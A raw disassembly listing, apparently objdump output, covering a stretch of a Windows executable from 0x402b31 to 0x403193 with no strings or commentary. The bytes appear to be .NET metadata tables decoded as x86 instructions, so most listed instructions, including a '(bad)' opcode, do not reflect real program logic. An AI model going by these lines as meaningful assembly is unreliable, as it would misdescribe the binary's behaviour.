  402b31:	00 09                	add    %cl,(%ecx)
  402b33:	05 68 08 06 00       	add    $0x60868,%eax
  402b38:	24 05                	and    $0x5,%al
  402b3a:	1b 08                	sbb    (%eax),%ecx
  402b3c:	06                   	push   %es
  402b3d:	00 35 00 ed 08 0e    	add    %dh,0xe08ed00
  402b43:	00 2e                	add    %ch,(%esi)
  402b45:	03 74 07 0e          	add    0xe(%edi,%eax,1),%esi
  402b49:	00 fc                	add    %bh,%ah
  402b4b:	09 74 07 0e          	or     %esi,0xe(%edi,%eax,1)
  402b4f:	00 53 0a             	add    %dl,0xa(%ebx)
  402b52:	74 07                	je     0x402b5b
  402b54:	06                   	push   %es
  402b55:	00 86 04 68 08 06    	add    %al,0x6086804(%esi)
  402b5b:	00 01                	add    %al,(%ecx)
  402b5d:	04 68                	add    $0x68,%al
  402b5f:	08 06                	or     %al,(%esi)
  402b61:	00 55 00             	add    %dl,0x0(%ebp)
  402b64:	68 08 06 00 45       	push   $0x45000608
  402b69:	07                   	pop    %es
  402b6a:	f6 06 06             	testb  $0x6,(%esi)
  402b6d:	00 2c 07             	add    %ch,(%edi,%eax,1)
  402b70:	ed                   	in     (%dx),%eax
  402b71:	08 06                	or     %al,(%esi)
  402b73:	00 3c 00             	add    %bh,(%eax,%eax,1)
  402b76:	68 08 0e 00 23       	push   $0x23000e08
  402b7b:	03 74 07 0e          	add    0xe(%edi,%eax,1),%esi
  402b7f:	00 42 03             	add    %al,0x3(%edx)
  402b82:	74 07                	je     0x402b8b
  402b84:	06                   	push   %es
  402b85:	00 75 05             	add    %dh,0x5(%ebp)
  402b88:	1b 08                	sbb    (%eax),%ecx
  402b8a:	06                   	push   %es
  402b8b:	00 63 00             	add    %ah,0x0(%ebx)
  402b8e:	b8 00 8f 00 0a       	mov    $0xa008f00,%eax
  402b93:	08 00                	or     %al,(%eax)
  402b95:	00 06                	add    %al,(%esi)
  402b97:	00 5d 04             	add    %bl,0x4(%ebp)
  402b9a:	1b 08                	sbb    (%eax),%ecx
  402b9c:	06                   	push   %es
  402b9d:	00 c3                	add    %al,%bl
  402b9f:	04 1b                	add    $0x1b,%al
  402ba1:	08 06                	or     %al,(%esi)
  402ba3:	00 7d 03             	add    %bh,0x3(%ebp)
  402ba6:	f6 06 0a             	testb  $0xa,(%esi)
  402ba9:	00 84 09 1b 08 06 00 	add    %al,0x6081b(%ecx,%ecx,1)
  402bb0:	22 01                	and    (%ecx),%al
  402bb2:	a2 06 06 00 91       	mov    %al,0x91000606
  402bb7:	03 a0 00 06 00 96    	add    -0x69fffa00(%eax),%esp
  402bbd:	03 f6                	add    %esi,%esi
  402bbf:	06                   	push   %es
  402bc0:	06                   	push   %es
  402bc1:	00 5f 07             	add    %bl,0x7(%edi)
  402bc4:	f6 06 0e             	testb  $0xe,(%esi)
  402bc7:	00 57 09             	add    %dl,0x9(%edi)
  402bca:	33 09                	xor    (%ecx),%ecx
  402bcc:	0e                   	push   %cs
  402bcd:	00 4b 09             	add    %cl,0x9(%ebx)
  402bd0:	33 09                	xor    (%ecx),%ecx
  402bd2:	06                   	push   %es
  402bd3:	00 e5                	add    %ah,%ch
  402bd5:	06                   	push   %es
  402bd6:	ed                   	in     (%dx),%eax
  402bd7:	08 12                	or     %dl,(%edx)
  402bd9:	00 6a 0a             	add    %ch,0xa(%edx)
  402bdc:	4f                   	dec    %edi
  402bdd:	07                   	pop    %es
  402bde:	06                   	push   %es
  402bdf:	00 d6                	add    %dl,%dh
  402be1:	06                   	push   %es
  402be2:	f6 06 06             	testb  $0x6,(%esi)
  402be5:	00 b3 06 7f 0a 0e    	add    %dh,0xe0a7f06(%ebx)
  402beb:	00 3c 0a             	add    %bh,(%edx,%ecx,1)
  402bee:	74 07                	je     0x402bf7
  402bf0:	0a 00                	or     (%eax),%al
  402bf2:	dd 06                	fldl   (%esi)
  402bf4:	f6 06 00             	testb  $0x0,(%esi)
  402bf7:	00 00                	add    %al,(%eax)
  402bf9:	00 97 00 00 00 00    	add    %dl,0x0(%edi)
  402bff:	00 01                	add    %al,(%ecx)
  402c01:	00 01                	add    %al,(%ecx)
  402c03:	00 00                	add    %al,(%eax)
  402c05:	00 10                	add    %dl,(%eax)
  402c07:	00 ee                	add    %ch,%dh
  402c09:	06                   	push   %es
  402c0a:	69 03 45 00 01 00    	imul   $0x10045,(%ebx),%eax
  402c10:	01 00                	add    %eax,(%eax)
  402c12:	81 01 10 00 8b 0a    	addl   $0xa8b0010,(%ecx)
  402c18:	97                   	xchg   %eax,%edi
  402c19:	08 45 00             	or     %al,0x0(%ebp)
  402c1c:	01 00                	add    %eax,(%eax)
  402c1e:	03 00                	add    (%eax),%eax
  402c20:	00 00                	add    %al,(%eax)
  402c22:	10 00                	adc    %al,(%eax)
  402c24:	aa                   	stos   %al,%es:(%edi)
  402c25:	00 97 08 45 00 01    	add    %dl,0x1004508(%edi)
  402c2b:	00 05 00 03 01 10    	add    %al,0x10010300
  402c31:	00 01                	add    %al,(%ecx)
  402c33:	00 00                	add    %al,(%eax)
  402c35:	00 45 00             	add    %al,0x0(%ebp)
  402c38:	01 00                	add    %eax,(%eax)
  402c3a:	0a 00                	or     (%eax),%al
  402c3c:	03 01                	add    (%ecx),%eax
  402c3e:	10 00                	adc    %al,(%eax)
  402c40:	1f                   	pop    %ds
  402c41:	00 00                	add    %al,(%eax)
  402c43:	00 45 00             	add    %al,0x0(%ebp)
  402c46:	0b 00                	or     (%eax),%eax
  402c48:	0d 00 02 00 10       	or     $0x10000200,%eax
  402c4d:	00 c1                	add    %al,%cl
  402c4f:	07                   	pop    %es
  402c50:	00 00                	add    %al,(%eax)
  402c52:	45                   	inc    %ebp
  402c53:	00 15 00 10 00 02    	add    %dl,0x2001000
  402c59:	00 10                	add    %dl,(%eax)
  402c5b:	00 b4 0a 00 00 45 00 	add    %dh,0x450000(%edx,%ecx,1)
  402c62:	1a 00                	sbb    (%eax),%al
  402c64:	1b 00                	sbb    (%eax),%eax
  402c66:	02 00                	add    (%eax),%al
  402c68:	10 00                	adc    %al,(%eax)
  402c6a:	0e                   	push   %cs
  402c6b:	0a 00                	or     (%eax),%al
  402c6d:	00 45 00             	add    %al,0x0(%ebp)
  402c70:	1e                   	push   %ds
  402c71:	00 24 00             	add    %ah,(%eax,%eax,1)
  402c74:	02 00                	add    (%eax),%al
  402c76:	10 00                	adc    %al,(%eax)
  402c78:	ab                   	stos   %eax,%es:(%edi)
  402c79:	0a 00                	or     (%eax),%al
  402c7b:	00 45 00             	add    %al,0x0(%ebp)
  402c7e:	23 00                	and    (%eax),%eax
  402c80:	2f                   	das
  402c81:	00 02                	add    %al,(%edx)
  402c83:	00 10                	add    %dl,(%eax)
  402c85:	00 34 08             	add    %dh,(%eax,%ecx,1)
  402c88:	00 00                	add    %al,(%eax)
  402c8a:	45                   	inc    %ebp
  402c8b:	00 27                	add    %ah,(%edi)
  402c8d:	00 38                	add    %bh,(%eax)
  402c8f:	00 02                	add    %al,(%edx)
  402c91:	00 10                	add    %dl,(%eax)
  402c93:	00 5f 0a             	add    %bl,0xa(%edi)
  402c96:	00 00                	add    %al,(%eax)
  402c98:	45                   	inc    %ebp
  402c99:	00 2d 00 45 00 06    	add    %ch,0x6004500
  402c9f:	00 74 04 3e          	add    %dh,0x3e(%esp,%eax,1)
  402ca3:	02 06                	add    (%esi),%al
  402ca5:	00 a0 07 41 02 06    	add    %ah,0x6024107(%eax)
  402cab:	00 07                	add    %al,(%edi)
  402cad:	0a 49 02             	or     0x2(%ecx),%cl
  402cb0:	06                   	push   %es
  402cb1:	00 ea                	add    %ch,%dl
  402cb3:	06                   	push   %es
  402cb4:	4d                   	dec    %ebp
  402cb5:	02 06                	add    (%esi),%al
  402cb7:	00 4a 0a             	add    %cl,0xa(%edx)
  402cba:	50                   	push   %eax
  402cbb:	02 01                	add    (%ecx),%al
  402cbd:	00 12                	add    %dl,(%edx)
  402cbf:	00 54 02 01          	add    %dl,0x1(%edx,%eax,1)
  402cc3:	00 6a 00             	add    %ch,0x0(%edx)
  402cc6:	59                   	pop    %ecx
  402cc7:	02 01                	add    (%ecx),%al
  402cc9:	00 78 00             	add    %bh,0x0(%eax)
  402ccc:	5e                   	pop    %esi
  402ccd:	02 01                	add    (%ecx),%al
  402ccf:	00 87 00 5e 02 01    	add    %al,0x1025e00(%edi)
  402cd5:	00 2e                	add    %ch,(%esi)
  402cd7:	00 62 02             	add    %ah,0x2(%edx)
  402cda:	06                   	push   %es
  402cdb:	00 74 04 3e          	add    %dh,0x3e(%esp,%eax,1)
  402cdf:	02 06                	add    (%esi),%al
  402ce1:	00 a0 07 41 02 06    	add    %ah,0x6024107(%eax)
  402ce7:	00 07                	add    %al,(%edi)
  402ce9:	0a 49 02             	or     0x2(%ecx),%cl
  402cec:	06                   	push   %es
  402ced:	00 ea                	add    %ch,%dl
  402cef:	06                   	push   %es
  402cf0:	4d                   	dec    %ebp
  402cf1:	02 06                	add    (%esi),%al
  402cf3:	00 4a 0a             	add    %cl,0xa(%edx)
  402cf6:	50                   	push   %eax
  402cf7:	02 01                	add    (%ecx),%al
  402cf9:	00 12                	add    %dl,(%edx)
  402cfb:	00 54 02 01          	add    %dl,0x1(%edx,%eax,1)
  402cff:	00 6a 00             	add    %ch,0x0(%edx)
  402d02:	59                   	pop    %ecx
  402d03:	02 01                	add    (%ecx),%al
  402d05:	00 78 00             	add    %bh,0x0(%eax)
  402d08:	5e                   	pop    %esi
  402d09:	02 01                	add    (%ecx),%al
  402d0b:	00 87 00 5e 02 01    	add    %al,0x1025e00(%edi)
  402d11:	00 2e                	add    %ch,(%esi)
  402d13:	00 62 02             	add    %ah,0x2(%edx)
  402d16:	01 00                	add    %eax,(%eax)
  402d18:	8a 01                	mov    (%ecx),%al
  402d1a:	4d                   	dec    %ebp
  402d1b:	02 01                	add    (%ecx),%al
  402d1d:	00 ef                	add    %ch,%bh
  402d1f:	01 4d 02             	add    %ecx,0x2(%ebp)
  402d22:	01 00                	add    %eax,(%eax)
  402d24:	35 02 4d 02 01       	xor    $0x1024d02,%eax
  402d29:	00 7a 02             	add    %bh,0x2(%edx)
  402d2c:	4d                   	dec    %ebp
  402d2d:	02 01                	add    (%ecx),%al
  402d2f:	00 b3 02 3e 02 01    	add    %dh,0x1023e02(%ebx)
  402d35:	00 8a 01 4d 02 01    	add    %cl,0x1024d01(%edx)
  402d3b:	00 09                	add    %cl,(%ecx)
  402d3d:	02 3e                	add    (%esi),%bh
  402d3f:	02 01                	add    (%ecx),%al
  402d41:	00 d5                	add    %dl,%ch
  402d43:	01 6a 02             	add    %ebp,0x2(%edx)
  402d46:	01 00                	add    %eax,(%eax)
  402d48:	64 02 6d 02          	add    %fs:0x2(%ebp),%ch
  402d4c:	01 00                	add    %eax,(%eax)
  402d4e:	8a 01                	mov    (%ecx),%al
  402d50:	4d                   	dec    %ebp
  402d51:	02 01                	add    (%ecx),%al
  402d53:	00 ef                	add    %ch,%bh
  402d55:	01 4d 02             	add    %ecx,0x2(%ebp)
  402d58:	01 00                	add    %eax,(%eax)
  402d5a:	35 02 4d 02 01       	xor    $0x1024d02,%eax
  402d5f:	00 7a 02             	add    %bh,0x2(%edx)
  402d62:	4d                   	dec    %ebp
  402d63:	02 01                	add    (%ecx),%al
  402d65:	00 b3 02 3e 02 01    	add    %dh,0x1023e02(%ebx)
  402d6b:	00 8a 01 4d 02 01    	add    %cl,0x1024d01(%edx)
  402d71:	00 09                	add    %cl,(%ecx)
  402d73:	02 3e                	add    (%esi),%bh
  402d75:	02 01                	add    (%ecx),%al
  402d77:	00 9e 01 6a 02 01    	add    %bl,0x1026a01(%esi)
  402d7d:	00 ee                	add    %ch,%dh
  402d7f:	02 71 02             	add    0x2(%ecx),%dh
  402d82:	01 00                	add    %eax,(%eax)
  402d84:	8a 01                	mov    (%ecx),%al
  402d86:	4d                   	dec    %ebp
  402d87:	02 01                	add    (%ecx),%al
  402d89:	00 bf 01 4d 02 01    	add    %bh,0x1024d01(%edi)
  402d8f:	00 1f                	add    %bl,(%edi)
  402d91:	02 4d 02             	add    0x2(%ebp),%cl
  402d94:	01 00                	add    %eax,(%eax)
  402d96:	4d                   	dec    %ebp
  402d97:	02 7a 02             	add    0x2(%edx),%bh
  402d9a:	01 00                	add    %eax,(%eax)
  402d9c:	d1 02                	roll   $1,(%edx)
  402d9e:	4d                   	dec    %ebp
  402d9f:	02 01                	add    (%ecx),%al
  402da1:	00 99 02 7d 02 01    	add    %bl,0x1027d02(%ecx)
  402da7:	00 0a                	add    %cl,(%edx)
  402da9:	03 85 02 50 20 00    	add    0x205002(%ebp),%eax
  402daf:	00 00                	add    %al,(%eax)
  402db1:	00 91 00 03 07 8e    	add    %dl,-0x71f8fd00(%ecx)
  402db7:	02 01                	add    (%ecx),%al
  402db9:	00 fc                	add    %bh,%ah
  402dbb:	20 00                	and    %al,(%eax)
  402dbd:	00 00                	add    %al,(%eax)
  402dbf:	00 86 18 15 08 01    	add    %al,0x1081518(%esi)
  402dc5:	00 02                	add    %al,(%edx)
  402dc7:	00 08                	add    %cl,(%eax)
  402dc9:	21 00                	and    %eax,(%eax)
  402dcb:	00 00                	add    %al,(%eax)
  402dcd:	00 96 00 fb 00 94    	add    %dl,-0x6bff0500(%esi)
  402dd3:	02 02                	add    (%edx),%al
  402dd5:	00 5c 21 00          	add    %bl,0x0(%ecx,%eiz,1)
  402dd9:	00 00                	add    %al,(%eax)
  402ddb:	00 96 00 19 01 94    	add    %dl,-0x6bfee700(%esi)
  402de1:	02 05 00 b0 21 00    	add    0x21b000,%al
  402de7:	00 00                	add    %al,(%eax)
  402de9:	00 96 00 3b 08 45    	add    %dl,0x45083b00(%esi)
  402def:	00 08                	add    %cl,(%eax)
  402df1:	00 b0 22 00 00 00    	add    %dh,0x22(%eax)
  402df7:	00 96 00 04 09 45    	add    %dl,0x45090400(%esi)
  402dfd:	00 09                	add    %cl,(%ecx)
  402dff:	00 9c 23 00 00 00 00 	add    %bl,0x0(%ebx,%eiz,1)
  402e06:	96                   	xchg   %eax,%esi
  402e07:	00 2e                	add    %ch,(%esi)
  402e09:	08 45 00             	or     %al,0x0(%ebp)
  402e0c:	0a 00                	or     (%eax),%al
  402e0e:	94                   	xchg   %eax,%esp
  402e0f:	24 00                	and    $0x0,%al
  402e11:	00 00                	add    %al,(%eax)
  402e13:	00 96 00 50 04 45    	add    %dl,0x45045000(%esi)
  402e19:	00 0b                	add    %cl,(%ebx)
  402e1b:	00 fa                	add    %bh,%dl
  402e1d:	24 00                	and    $0x0,%al
  402e1f:	00 00                	add    %al,(%eax)
  402e21:	00 86 18 15 08 01    	add    %al,0x1081518(%esi)
  402e27:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402e2a:	03 25 00 00 00 00    	add    0x0,%esp
  402e30:	86 18                	xchg   %bl,(%eax)
  402e32:	15 08 01 00 0c       	adc    $0xc000108,%eax
  402e37:	00 0c 25 00 00 00 00 	add    %cl,0x0(,%eiz,1)
  402e3e:	e1 01                	loope  0x402e41
  402e40:	76 0a                	jbe    0x402e4c
  402e42:	01 00                	add    %eax,(%eax)
  402e44:	0c 00                	or     $0x0,%al
  402e46:	80 26 00             	andb   $0x0,(%esi)
  402e49:	00 00                	add    %al,(%eax)
  402e4b:	00 e1                	add    %ah,%cl
  402e4d:	01 14 04             	add    %edx,(%esp,%eax,1)
  402e50:	20 00                	and    %al,(%eax)
  402e52:	0c 00                	or     $0x0,%al
  402e54:	82 26 00             	andb   $0x0,(%esi)
  402e57:	00 00                	add    %al,(%eax)
  402e59:	00 86 18 15 08 01    	add    %al,0x1081518(%esi)
  402e5f:	00 0d 00 8c 26 00    	add    %cl,0x268c00
  402e65:	00 00                	add    %al,(%eax)
  402e67:	00 e1                	add    %ah,%cl
  402e69:	01 76 0a             	add    %esi,0xa(%esi)
  402e6c:	01 00                	add    %eax,(%eax)
  402e6e:	0d 00 00 28 00       	or     $0x280000,%eax
  402e73:	00 00                	add    %al,(%eax)
  402e75:	00 e1                	add    %ah,%cl
  402e77:	01 14 04             	add    %edx,(%esp,%eax,1)
  402e7a:	20 00                	and    %al,(%eax)
  402e7c:	0d 00 02 28 00       	or     $0x280200,%eax
  402e81:	00 00                	add    %al,(%eax)
  402e83:	00 86 08 7c 01 a2    	add    %al,-0x5dfe83f8(%esi)
  402e89:	02 0e                	add    (%esi),%cl
  402e8b:	00 0a                	add    %cl,(%edx)
  402e8d:	28 00                	sub    %al,(%eax)
  402e8f:	00 00                	add    %al,(%eax)
  402e91:	00 86 08 83 01 10    	add    %al,0x10018308(%esi)
  402e97:	00 0e                	add    %cl,(%esi)
  402e99:	00 13                	add    %dl,(%ebx)
  402e9b:	28 00                	sub    %al,(%eax)
  402e9d:	00 00                	add    %al,(%eax)
  402e9f:	00 86 08 d4 03 a2    	add    %al,-0x5dfc2bf8(%esi)
  402ea5:	02 0f                	add    (%edi),%cl
  402ea7:	00 1b                	add    %bl,(%ebx)
  402ea9:	28 00                	sub    %al,(%eax)
  402eab:	00 00                	add    %al,(%eax)
  402ead:	00 86 08 e1 03 10    	add    %al,0x1003e108(%esi)
  402eb3:	00 0f                	add    %cl,(%edi)
  402eb5:	00 24 28             	add    %ah,(%eax,%ebp,1)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	00 00                	add    %al,(%eax)
  402ebc:	86 08                	xchg   %cl,(%eax)
  402ebe:	8a 07                	mov    (%edi),%al
  402ec0:	a2 02 10 00 2c       	mov    %al,0x2c001002
  402ec5:	28 00                	sub    %al,(%eax)
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	00 86 08 95 07 10    	add    %al,0x10079508(%esi)
  402ecf:	00 10                	add    %dl,(%eax)
  402ed1:	00 35 28 00 00 00    	add    %dh,0x28
  402ed7:	00 86 08 e3 07 a2    	add    %al,-0x5df81cf8(%esi)
  402edd:	02 11                	add    (%ecx),%dl
  402edf:	00 3d 28 00 00 00    	add    %bh,0x28
  402ee5:	00 86 08 f5 07 10    	add    %al,0x1007f508(%esi)
  402eeb:	00 11                	add    %dl,(%ecx)
  402eed:	00 46 28             	add    %al,0x28(%esi)
  402ef0:	00 00                	add    %al,(%eax)
  402ef2:	00 00                	add    %al,(%eax)
  402ef4:	86 08                	xchg   %cl,(%eax)
  402ef6:	c6                   	(bad)
  402ef7:	08 a6 02 12 00 4e    	or     %ah,0x4e001202(%esi)
  402efd:	28 00                	sub    %al,(%eax)
  402eff:	00 00                	add    %al,(%eax)
  402f01:	00 86 08 d7 08 05    	add    %al,0x508d708(%esi)
  402f07:	00 12                	add    %dl,(%edx)
  402f09:	00 57 28             	add    %dl,0x28(%edi)
  402f0c:	00 00                	add    %al,(%eax)
  402f0e:	00 00                	add    %al,(%eax)
  402f10:	86 18                	xchg   %bl,(%eax)
  402f12:	15 08 01 00 13       	adc    $0x13000108,%eax
  402f17:	00 60 28             	add    %ah,0x28(%eax)
  402f1a:	00 00                	add    %al,(%eax)
  402f1c:	00 00                	add    %al,(%eax)
  402f1e:	86 08                	xchg   %cl,(%eax)
  402f20:	7c 01                	jl     0x402f23
  402f22:	a2 02 13 00 68       	mov    %al,0x68001302
  402f27:	28 00                	sub    %al,(%eax)
  402f29:	00 00                	add    %al,(%eax)
  402f2b:	00 86 08 83 01 10    	add    %al,0x10018308(%esi)
  402f31:	00 13                	add    %dl,(%ebx)
  402f33:	00 71 28             	add    %dh,0x28(%ecx)
  402f36:	00 00                	add    %al,(%eax)
  402f38:	00 00                	add    %al,(%eax)
  402f3a:	86 08                	xchg   %cl,(%eax)
  402f3c:	36 04 a6             	ss add $0xa6,%al
  402f3f:	02 14 00             	add    (%eax,%eax,1),%dl
  402f42:	79 28                	jns    0x402f6c
  402f44:	00 00                	add    %al,(%eax)
  402f46:	00 00                	add    %al,(%eax)
  402f48:	86 08                	xchg   %cl,(%eax)
  402f4a:	3f                   	aas
  402f4b:	04 05                	add    $0x5,%al
  402f4d:	00 14 00             	add    %dl,(%eax,%eax,1)
  402f50:	82 28 00             	subb   $0x0,(%eax)
  402f53:	00 00                	add    %al,(%eax)
  402f55:	00 86 08 ba 03 aa    	add    %al,-0x55fc45f8(%esi)
  402f5b:	02 15 00 8a 28 00    	add    0x288a00,%dl
  402f61:	00 00                	add    %al,(%eax)
  402f63:	00 86 08 c7 03 ae    	add    %al,-0x51fc38f8(%esi)
  402f69:	02 15 00 93 28 00    	add    0x289300,%dl
  402f6f:	00 00                	add    %al,(%eax)
  402f71:	00 86 08 c6 07 b3    	add    %al,-0x4cf839f8(%esi)
  402f77:	02 16                	add    (%esi),%dl
  402f79:	00 9b 28 00 00 00    	add    %bl,0x28(%ebx)
  402f7f:	00 86 08 cf 07 b8    	add    %al,-0x47f830f8(%esi)
  402f85:	02 16                	add    (%esi),%dl
  402f87:	00 a4 28 00 00 00 00 	add    %ah,0x0(%eax,%ebp,1)
  402f8e:	86 18                	xchg   %bl,(%eax)
  402f90:	15 08 01 00 17       	adc    $0x17000108,%eax
  402f95:	00 ad 28 00 00 00    	add    %ch,0x28(%ebp)
  402f9b:	00 86 08 7c 01 a2    	add    %al,-0x5dfe83f8(%esi)
  402fa1:	02 17                	add    (%edi),%dl
  402fa3:	00 b5 28 00 00 00    	add    %dh,0x28(%ebp)
  402fa9:	00 86 08 83 01 10    	add    %al,0x10018308(%esi)
  402faf:	00 17                	add    %dl,(%edi)
  402fb1:	00 be 28 00 00 00    	add    %bh,0x28(%esi)
  402fb7:	00 86 08 d4 03 a2    	add    %al,-0x5dfc2bf8(%esi)
  402fbd:	02 18                	add    (%eax),%bl
  402fbf:	00 c6                	add    %al,%dh
  402fc1:	28 00                	sub    %al,(%eax)
  402fc3:	00 00                	add    %al,(%eax)
  402fc5:	00 86 08 e1 03 10    	add    %al,0x1003e108(%esi)
  402fcb:	00 18                	add    %bl,(%eax)
  402fcd:	00 cf                	add    %cl,%bh
  402fcf:	28 00                	sub    %al,(%eax)
  402fd1:	00 00                	add    %al,(%eax)
  402fd3:	00 86 08 8a 07 a2    	add    %al,-0x5df875f8(%esi)
  402fd9:	02 19                	add    (%ecx),%bl
  402fdb:	00 d7                	add    %dl,%bh
  402fdd:	28 00                	sub    %al,(%eax)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	00 86 08 95 07 10    	add    %al,0x10079508(%esi)
  402fe7:	00 19                	add    %bl,(%ecx)
  402fe9:	00 e0                	add    %ah,%al
  402feb:	28 00                	sub    %al,(%eax)
  402fed:	00 00                	add    %al,(%eax)
  402fef:	00 86 08 e3 07 a2    	add    %al,-0x5df81cf8(%esi)
  402ff5:	02 1a                	add    (%edx),%bl
  402ff7:	00 e8                	add    %ch,%al
  402ff9:	28 00                	sub    %al,(%eax)
  402ffb:	00 00                	add    %al,(%eax)
  402ffd:	00 86 08 f5 07 10    	add    %al,0x1007f508(%esi)
  403003:	00 1a                	add    %bl,(%edx)
  403005:	00 f1                	add    %dh,%cl
  403007:	28 00                	sub    %al,(%eax)
  403009:	00 00                	add    %al,(%eax)
  40300b:	00 86 08 c6 08 a6    	add    %al,-0x59f739f8(%esi)
  403011:	02 1b                	add    (%ebx),%bl
  403013:	00 f9                	add    %bh,%cl
  403015:	28 00                	sub    %al,(%eax)
  403017:	00 00                	add    %al,(%eax)
  403019:	00 86 08 d7 08 05    	add    %al,0x508d708(%esi)
  40301f:	00 1b                	add    %bl,(%ebx)
  403021:	00 02                	add    %al,(%edx)
  403023:	29 00                	sub    %eax,(%eax)
  403025:	00 00                	add    %al,(%eax)
  403027:	00 86 18 15 08 01    	add    %al,0x1081518(%esi)
  40302d:	00 1c 00             	add    %bl,(%eax,%eax,1)
  403030:	0b 29                	or     (%ecx),%ebp
  403032:	00 00                	add    %al,(%eax)
  403034:	00 00                	add    %al,(%eax)
  403036:	86 08                	xchg   %cl,(%eax)
  403038:	7c 01                	jl     0x40303b
  40303a:	a2 02 1c 00 13       	mov    %al,0x13001c02
  40303f:	29 00                	sub    %eax,(%eax)
  403041:	00 00                	add    %al,(%eax)
  403043:	00 86 08 83 01 10    	add    %al,0x10018308(%esi)
  403049:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40304c:	1c 29                	sbb    $0x29,%al
  40304e:	00 00                	add    %al,(%eax)
  403050:	00 00                	add    %al,(%eax)
  403052:	86 08                	xchg   %cl,(%eax)
  403054:	36 04 a6             	ss add $0xa6,%al
  403057:	02 1d 00 24 29 00    	add    0x292400,%bl
  40305d:	00 00                	add    %al,(%eax)
  40305f:	00 86 08 3f 04 05    	add    %al,0x5043f08(%esi)
  403065:	00 1d 00 2d 29 00    	add    %bl,0x292d00
  40306b:	00 00                	add    %al,(%eax)
  40306d:	00 86 08 54 01 aa    	add    %al,-0x55feabf8(%esi)
  403073:	02 1e                	add    (%esi),%bl
  403075:	00 35 29 00 00 00    	add    %dh,0x29
  40307b:	00 86 08 68 01 ae    	add    %al,-0x51fe97f8(%esi)
  403081:	02 1e                	add    (%esi),%bl
  403083:	00 3e                	add    %bh,(%esi)
  403085:	29 00                	sub    %eax,(%eax)
  403087:	00 00                	add    %al,(%eax)
  403089:	00 86 08 8c 09 be    	add    %al,-0x41f673f8(%esi)
  40308f:	02 1f                	add    (%edi),%bl
  403091:	00 46 29             	add    %al,0x29(%esi)
  403094:	00 00                	add    %al,(%eax)
  403096:	00 00                	add    %al,(%eax)
  403098:	86 08                	xchg   %cl,(%eax)
  40309a:	9b                   	fwait
  40309b:	09 c8                	or     %ecx,%eax
  40309d:	02 1f                	add    (%edi),%bl
  40309f:	00 4f 29             	add    %cl,0x29(%edi)
  4030a2:	00 00                	add    %al,(%eax)
  4030a4:	00 00                	add    %al,(%eax)
  4030a6:	86 18                	xchg   %bl,(%eax)
  4030a8:	15 08 01 00 20       	adc    $0x20000108,%eax
  4030ad:	00 58 29             	add    %bl,0x29(%eax)
  4030b0:	00 00                	add    %al,(%eax)
  4030b2:	00 00                	add    %al,(%eax)
  4030b4:	86 08                	xchg   %cl,(%eax)
  4030b6:	7c 01                	jl     0x4030b9
  4030b8:	a2 02 20 00 60       	mov    %al,0x60002002
  4030bd:	29 00                	sub    %eax,(%eax)
  4030bf:	00 00                	add    %al,(%eax)
  4030c1:	00 86 08 83 01 10    	add    %al,0x10018308(%esi)
  4030c7:	00 20                	add    %ah,(%eax)
  4030c9:	00 69 29             	add    %ch,0x29(%ecx)
  4030cc:	00 00                	add    %al,(%eax)
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	86 08                	xchg   %cl,(%eax)
  4030d2:	a8 03                	test   $0x3,%al
  4030d4:	a2 02 21 00 71       	mov    %al,0x71002102
  4030d9:	29 00                	sub    %eax,(%eax)
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	00 86 08 b1 03 10    	add    %al,0x1003b108(%esi)
  4030e3:	00 21                	add    %ah,(%ecx)
  4030e5:	00 7a 29             	add    %bh,0x29(%edx)
  4030e8:	00 00                	add    %al,(%eax)
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	86 08                	xchg   %cl,(%eax)
  4030ee:	08 07                	or     %al,(%edi)
  4030f0:	a2 02 22 00 82       	mov    %al,0x82002202
  4030f5:	29 00                	sub    %eax,(%eax)
  4030f7:	00 00                	add    %al,(%eax)
  4030f9:	00 86 08 11 07 10    	add    %al,0x10071108(%esi)
  4030ff:	00 22                	add    %ah,(%edx)
  403101:	00 8b 29 00 00 00    	add    %cl,0x29(%ebx)
  403107:	00 86 08 ad 07 2a    	add    %al,0x2a07ad08(%esi)
  40310d:	01 23                	add    %esp,(%ebx)
  40310f:	00 93 29 00 00 00    	add    %dl,0x29(%ebx)
  403115:	00 86 08 b7 07 15    	add    %al,0x1507b708(%esi)
  40311b:	00 23                	add    %ah,(%ebx)
  40311d:	00 9c 29 00 00 00 00 	add    %bl,0x0(%ecx,%ebp,1)
  403124:	86 08                	xchg   %cl,(%eax)
  403126:	13 09                	adc    (%ecx),%ecx
  403128:	a2 02 24 00 a4       	mov    %al,0xa4002402
  40312d:	29 00                	sub    %eax,(%eax)
  40312f:	00 00                	add    %al,(%eax)
  403131:	00 86 08 23 09 10    	add    %al,0x10092308(%esi)
  403137:	00 24 00             	add    %ah,(%eax,%eax,1)
  40313a:	ad                   	lods   %ds:(%esi),%eax
  40313b:	29 00                	sub    %eax,(%eax)
  40313d:	00 00                	add    %al,(%eax)
  40313f:	00 86 08 ac 08 d3    	add    %al,-0x2cf753f8(%esi)
  403145:	02 25 00 b5 29 00    	add    0x29b500,%ah
  40314b:	00 00                	add    %al,(%eax)
  40314d:	00 86 08 b9 08 dc    	add    %al,-0x23f746f8(%esi)
  403153:	02 25 00 be 29 00    	add    0x29be00,%ah
  403159:	00 00                	add    %al,(%eax)
  40315b:	00 86 18 15 08 01    	add    %al,0x1081518(%esi)
  403161:	00 26                	add    %ah,(%esi)
  403163:	00 c7                	add    %al,%bh
  403165:	29 00                	sub    %eax,(%eax)
  403167:	00 00                	add    %al,(%eax)
  403169:	00 86 08 93 0a e6    	add    %al,-0x19f56cf8(%esi)
  40316f:	02 26                	add    (%esi),%ah
  403171:	00 cf                	add    %cl,%bh
  403173:	29 00                	sub    %eax,(%eax)
  403175:	00 00                	add    %al,(%eax)
  403177:	00 86 08 9f 0a f0    	add    %al,-0xff560f8(%esi)
  40317d:	02 26                	add    (%esi),%ah
  40317f:	00 d8                	add    %bl,%al
  403181:	29 00                	sub    %eax,(%eax)
  403183:	00 00                	add    %al,(%eax)
  403185:	00 86 18 15 08 01    	add    %al,0x1081518(%esi)
  40318b:	00 27                	add    %ah,(%edi)
  40318d:	00 00                	add    %al,(%eax)
  40318f:	00 01                	add    %al,(%ecx)
  403191:	00 e8                	add    %ch,%al
  403193:	08 00                	or     %al,(%eax)
